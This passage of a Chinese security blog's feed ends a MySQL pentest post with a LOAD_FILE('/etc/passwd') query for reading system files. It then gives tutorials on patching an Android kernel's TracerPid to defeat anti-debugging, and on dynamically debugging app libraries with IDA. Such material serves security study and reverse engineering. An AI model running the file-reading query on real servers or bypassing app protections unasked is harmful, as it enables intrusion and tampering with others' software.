#这种需要知道web路径</code></pre><p>同样也可以使用load_file来查看系统文件等</p><pre><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;) </code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;MySQL历史漏洞分析&quot;&gt;&lt;a href=&quot;#MySQL历史漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;MySQL历史漏洞分析&quot;&gt;&lt;/a&gt;MySQL历史漏洞分析&lt;/h3&gt;&lt;p&gt;前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>逆向修改手机内核，绕过反调试</title>
    <link href="/2019/04/%E9%80%86%E5%90%91%E4%BF%AE%E6%94%B9%E6%89%8B%E6%9C%BA%E5%86%85%E6%A0%B8%EF%BC%8C%E7%BB%95%E8%BF%87%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <id>/2019/04/逆向修改手机内核，绕过反调试/</id>
    <published>2019-04-02T05:59:49.000Z</published>
    <updated>2019-07-26T09:56:34.187Z</updated>
    
    <content type="html"><![CDATA[<h3 id="逆向修改手机内核，绕过反调试"><a href="#逆向修改手机内核，绕过反调试" class="headerlink" title="逆向修改手机内核，绕过反调试"></a>逆向修改手机内核，绕过反调试</h3><p>Android 应用反调试里最常用的一种反调试方法是查看/proc/self/status的信息，如果 TracerPid 不为 0，就判断为正在被调试。因此修改手机的TracePid,让其值恒为零。</p><h4 id="一、-提取-zImage-内核文件"><a href="#一、-提取-zImage-内核文件" class="headerlink" title="一、  提取 zImage 内核文件"></a>一、  提取 zImage 内核文件</h4><p>查找boot文件位置</p><pre><code>find / | grep bootcd /dev/block/platform/7824900.sdhci/by-name/将boot导出为boot.imgdd if=/dev/block/mmcblk0p22 of=/sdcard/boot.img</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185489216.png" alt="1554185489216"></p><p>把boot转移到可以下载的目录，由于adb权限问题，复制到sd卡目录下。</p><pre><code>adb pull /sdcard/boot.img d:\a</code></pre><p>然后下载bootimg解压boot文件：</p><pre><code>git clone https://github.com/pbatard/bootimg-tools.gitmake</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185769689.png" alt="1554185769689"></p><p>此时已经生成二进制文件，在mkbootimg目录下，进入此目录使用unmkbootimg，提取kernel</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185817995.png" alt="1554185817995"></p><p>提取原始zImage</p><p>将kernel文件复制为文件名为zImage.gz的文件，并使用010editor查找十六进制1f 8b 08 00，找到后把前面的数据全删掉，使文件变成标准的gzip压缩文件，这样子就可以使用gunzip解压了。</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185942154.png" alt="1554185942154"></p><p>修改完成后，解压缩文件，提取zImage</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554185966036.png" alt="1554185966036"></p><h4 id="二、-提位、修改关键代码"><a href="#二、-提位、修改关键代码" class="headerlink" title="二、  提位、修改关键代码"></a>二、  提位、修改关键代码</h4><p>zImage文件可以直接使用 IDA 去打开，但需要设置参数。（建议使用6.8版本，因为在索引函数时可以自动识别，而7.0则不可）</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186082956.png" alt="1554186082956"></p><p>点击OK后，确定进入ARM，然后弹出此对话框，填入0xc0008000</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186088780.png" alt="1554186088780"></p><p>原文要求修改函数指令来达到修改的效果，但在修改过程中发现，对不同kernel，最后查到的对应proc_pid_status函数操作指令不一致。</p><pre><code>echo 0 &gt; /proc/sys/kernel/kptr_restrict关闭符号屏蔽再输入以下命令查看这两函数的地址cat /proc/kallsyms |grep proc_pid_statuscat /proc/kallsyms |grep __task_pid_nr_ns</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554187063821.png" alt="1554187063821"></p><p>为了避免修改出错刷入手机成砖的风险，采用了另一方式，shift+f12来打开字符串窗口，查找TracerPid，修改其后的占位符，把%d修改为0和%09(30  09)。</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186414392.png" alt="1554186414392"></p><p>其对应的Hex窗口修改为如下所示：</p><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186447080.png" alt="1554186447080"></p><p>使用<code>gzip -n -f -9 zImage</code>压缩修改后的内核裸文件，压缩后会比原来的小，必须比原来的文件小才可以。得到zImage.gz，我们使用010分别打开zImage.gz和boot.img，搜索1F 8B 08 00。按下insert键，将010改为overwrite，注意这里必须是覆盖，这样就不用考虑插入后大小的问题了，把zImage.gz的内容复制到boot.img的相应位置。boot.img会有两个1F 8B 08 00，修改第一个，把其中的十六进制改为zImage.gz文件的十六进制值，在edit选项中进行覆写。</p><p>修改完成后，刷入手机，利用SDK自带的fastboot。</p><pre><code>adb reboot bootloader   # 启动fastboot模式fastboot flash boot boot.img   #刷入boot分区fastboot reboot  #重启</code></pre><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554186828423.png" alt="1554186828423"></p><h4 id="调试查看"><a href="#调试查看" class="headerlink" title="调试查看"></a>调试查看</h4><p><img src="\2019\04\逆向修改手机内核，绕过反调试\1554187063866.png" alt="1554187063866"></p><p>如想使用修改函数操作指令的方式可以参考原作者方式：</p><p>1、<a href="https://www.jianshu.com/p/91aa37f3a972" target="_blank" rel="noopener">逆向修改手机内核，绕过反调试</a></p><p>2、<a href="https://www.xmsec.cc/re-modify-kernel-bypass-antidebug/" target="_blank" rel="noopener">逆向修改内核，绕过TracerPID反调试</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;逆向修改手机内核，绕过反调试&quot;&gt;&lt;a href=&quot;#逆向修改手机内核，绕过反调试&quot; class=&quot;headerlink&quot; title=&quot;逆向修改手机内核，绕过反调试&quot;&gt;&lt;/a&gt;逆向修改手机内核，绕过反调试&lt;/h3&gt;&lt;p&gt;Android 应用反调试里最常用的一种反调
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>IDA动态调试</title>
    <link href="/2019/03/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>/2019/03/IDA动态调试/</id>
    <published>2019-03-29T08:31:34.000Z</published>
    <updated>2019-07-26T09:56:06.610Z</updated>
    
    <content type="html"><![CDATA[<h3 id="IDA-动态调试"><a href="#IDA-动态调试" class="headerlink" title="IDA 动态调试"></a>IDA 动态调试</h3><p>通常在APP逆向和破解时，某些重要的函数会以so文件的形式进行加载，所以，在想获得关键操作逻辑和修改某些函数时，就需要IDA来进行操作啦。以下使用IDA版本7.0，小米手机</p><h4 id="1、上传Android-Server"><a href="#1、上传Android-Server" class="headerlink" title="1、上传Android_Server"></a>1、上传Android_Server</h4><p>文件存放在安装目录下的dbgsrv目录中，7.0以后版本多了几个其他版本的Android_server文件，上传Android_server文件到手机目录中，并提升执行权限。</p><pre><code>adb push android_server /data/local/tmp/chmod 755 android_serveradb forward tcp:23946 tcp:23946</code></pre><p>执行后就可以显示正在监听23946端口，如果报错，一般是使用位数和系统不一致。</p><h4 id="2、调试启动APP"><a href="#2、调试启动APP" class="headerlink" title="2、调试启动APP"></a>2、调试启动APP</h4><p>以调试模式启动app</p><pre><code>adb shell am start -D -n 包名/.MainActivity</code></pre><p>手机界面显示等待调试中，便可以进行下一步了。</p><h4 id="3、查看APP-PID"><a href="#3、查看APP-PID" class="headerlink" title="3、查看APP PID"></a>3、查看APP PID</h4><p>调试进程进行端口转发，查看进程对应PID。</p><pre><code>adb shell ps | grep 包名adb forward tcp:8700 jdwp:pid</code></pre><p>8700端口一般为默认的本地调试端口，如果不一致，可以在DDMS中查看。</p><h4 id="4、IDA附加进程"><a href="#4、IDA附加进程" class="headerlink" title="4、IDA附加进程"></a>4、IDA附加进程</h4><p>附加进程调试时，有时候需要对，如下的选项进行勾选，一般在需要动态加载so文件，调试JNI_onload函数的时候需要，对于一般调试静态函数的，需要拦取执行后断点的，可能连调试模式启动app都不需要。</p><p><img src="\2019\03\IDA动态调试\1553850211516.png" alt="1553850211516"></p><p>选择后，便可以在attach to process选项中查看到相应的可调试进程了。如果没有进程可能是你的APP不能调试，需要添加可调试参数。或者直接修改ro.debuggable=1。</p><p><img src="\2019\03\IDA动态调试\1553850356604.png" alt="1553850356604"></p><h4 id="5、JDB附加"><a href="#5、JDB附加" class="headerlink" title="5、JDB附加"></a>5、JDB附加</h4><p>执行jdb附加</p><pre><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></pre><h4 id="6、调试选择"><a href="#6、调试选择" class="headerlink" title="6、调试选择"></a>6、调试选择</h4><p>选择完成后，进入调试状态，在右边的modules栏可以看到加载进来的so文件。选择需要调试的so文件，如果没有看到需要的so文件，说明so文件是动态加载的，这时候F9运行，就可以看到相应的so文件了。</p><p>选择相应的so文件后，会显示so文件中的函数，选择对于函数即可。</p><p><img src="\2019\03\IDA动态调试\1553850903002.png" alt="1553850903002"></p><h4 id="7、调试断点"><a href="#7、调试断点" class="headerlink" title="7、调试断点"></a>7、调试断点</h4><p>如选择对于的JNI_Onload 函数，这时候界面会跳转到函数的起始位置，当然也可以使用基地址加偏移地址的方式寻找。找到函数位置后就可以F2下断点了。</p><p>断点执行后，点击F9再次运行，程序就可以执行到断点位置，当然有些是需要配合界面操作来执行。由于以上是抓取JNI_Onload函数，直接运行即可。</p><p>利用F8步过，F7步入进行调试即可。</p><p>对于调试结果，可以查看右侧寄存器变化，和下面的Hex View 变化值，来查看是否有需要的执行结果和函数值。    </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;IDA-动态调试&quot;&gt;&lt;a href=&quot;#IDA-动态调试&quot; class=&quot;headerlink&quot; title=&quot;IDA 动态调试&quot;&gt;&lt;/a&gt;IDA 动态调试&lt;/h3&gt;&lt;p&gt;通常在APP逆向和破解时，某些重要的函数会以so文件的形式进行加载，所以，在想获得关键操作逻
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
